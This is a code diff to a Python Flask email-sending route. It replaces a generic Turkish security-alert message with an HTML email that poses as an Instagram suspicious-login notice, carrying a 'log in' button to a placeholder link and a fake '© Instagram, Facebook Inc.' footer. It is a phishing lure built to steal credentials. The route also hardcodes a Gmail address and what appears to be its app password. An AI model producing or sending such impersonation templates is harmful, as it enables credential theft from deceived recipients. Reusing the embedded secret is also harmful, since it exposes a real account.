@@ -37,20 +37,27 @@ def send_email_route():
         sender_email = "xaetch@gmail.com"
         sender_app_password = "ltgh rovm xrrf mmiv"  
         recipient_email = data.get('recipientEmail')
-        email_subject = "Hesabınıza yakın zamanda erişim denendi."
+        email_subject = "Olağandışı Bir Giriş Denemesi Saptadık"
         email_content = """
-            <html>
-            <body>
-                <p>Sayın [Alıcı Adı],</p>
-                <p> Üzgün bir şekilde size bildirmeliyiz ki hesabınızla ilgili olarak yakın zamanda güvenlik ihlali tespit edilmiştir.</p>
-                <p> Lütfen bu durumu kontrol etmek ve gereken önlemleri almak adına aşağıdaki bağlantıya tıklayın:</p>
-                <p> <a href="https://www.ornek.com/guvenlik-onlemleri" target="_blank" style="color: #0000FF; text-decoration: none;">Güvenlik Önlemleri</a></p>
-                <p> Eğer bu işlemi siz yapmadıysanız, lütfen derhal müşteri hizmetlerimizle iletişime geçin.</p>
-                <p>     Saygılarımızla,<br/>[Firma Adı]</p>
-            </body>
-            </html>
-"""
+<body>
 
+    <h1 style= "color: black">Hesabına şüpheli görünen bir giriş denemesi fark ettik.</h1>
+
+    <p style= "color: black">Kimliğini doğrulaman amacıyla giriş yapman gerekiyor. Aşağıdaki linke tıklayarak giriş yap.
+
+    <div
+        style="display: flex; align-items:center; justify-content:center; margin-top: 40px; border-radius: 5px; background-color: #0095f6; font-weight: bold; text-align: center; width:200px;border: none;font-size: 14px;margin: 10px 0;">
+        <a href="http://www.firma-website.com"
+            style="color: #ffffff; text-decoration: none; display: inline-block; padding: 5px 9px; border: none; width: 100%; font-size: 12px; cursor: pointer;">
+            Giriş yap
+        </a>
+    </div>
+
+    <br /><p style= "color: black">© Instagram,
+    Facebook Inc.</p>
+
+</body>
+"""
         response = send_email(sender_email, recipient_email, sender_app_password, email_subject, email_content)
 
         return jsonify(response)
